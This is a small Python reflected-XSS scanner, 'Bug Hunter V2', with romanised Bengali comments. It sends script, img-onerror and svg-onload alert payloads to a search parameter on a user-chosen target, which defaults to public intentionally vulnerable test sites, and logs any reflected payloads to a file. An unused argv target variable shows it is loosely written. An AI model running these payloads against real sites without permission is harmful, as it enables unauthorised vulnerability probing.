import sys
target = sys.argv[1] if len(sys.argv)>1 else 'https://testphp.vulnweb.com'
import requests

# Ekhane tui chaile target change korte parbi
TARGET = input("Target URL de (ex: http://testfire.net): ")
if TARGET == "":
    TARGET = "http://testfire.net"

print(f"\n[*] Bug Hunter V2 - Target: {TARGET}\n")

payloads = [
    "<script>alert('XSS1')</script>",
    "<img src=x onerror=alert('XSS3')>",
    "<svg onload=alert('XSS4')>",
]

found = []

for p in payloads:
    url = TARGET + "/search.jsp?query=" + p
    print(f"[*] Testing: {p[:15]}...")
    try:
        r = requests.get(url, timeout=5)
        if p in r.text:
            print(f"  [HIGH] XSS FOUND!")
            found.append(p)
        else:
            print(f"  [SAFE]")
    except Exception as e:
        print(f"  [ERROR] {e}")

with open("result.txt", "w") as f:
    f.write(f"Target: {TARGET}\n")
    for x in found:
        f.write(f"XSS: {x}\n")

print(f"\n[+] Done! Total {len(found)} found!")
print("[+] cat result.txt diye dekhe ne")
